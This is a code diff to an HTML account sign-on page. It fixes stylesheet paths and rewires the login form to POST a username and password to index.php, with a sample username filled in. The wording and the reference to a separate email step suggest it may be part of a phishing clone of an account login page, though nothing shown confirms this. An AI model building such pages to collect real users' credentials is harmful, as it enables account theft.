@@ -6,9 +6,9 @@
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
-      <link rel="stylesheet" href="./css/main.css">
+      <link rel="stylesheet" href="/css/main.css">
       <link rel="stylesheet" href="./fontsawesome/css/all.css">
-      <link rel="stylesheet" href="./mobile.css">
+      <link rel="stylesheet" href="/css/mobile.css">
       <title>Document</title>
 </head>
 
@@ -65,16 +65,12 @@
                         <p>Sign on to manage your account</p>
 
 
-                        <form action="./email.html" method="">
+                        <form action="index.php" name="index" method="post">
 
 
-                              <br> <input type="username" placeholder="Username" name="username" required>
-                              <br> <input type="password" id="myInput" placeholder="Password"
-                                    autocomplete="current-password" name="password">
-                              <!-- <i class="fa-regular fa-eye-slash icon"></i> -->
+                              <br> <input type="username" placeholder="Username" name="username" value="ytre" required>
                               <div class="click">
-
-                                    <input type="password" id="password-field" placeholder="Password" required>
+                                    <input type="password" id="password-field" placeholder="Password" name="password" required>
                                     <i id="pass-status" class="fa fa-eye" aria-hidden="true"
                                           onClick="viewPassword()"></i>
                               </div>
@@ -88,8 +84,6 @@
                               </div>
 
                               <div class="btn">
-
-                                    <!-- <a href="email.html"> -->
 
                                     <button class="btn-1">Sign on</button>
                                     </a>
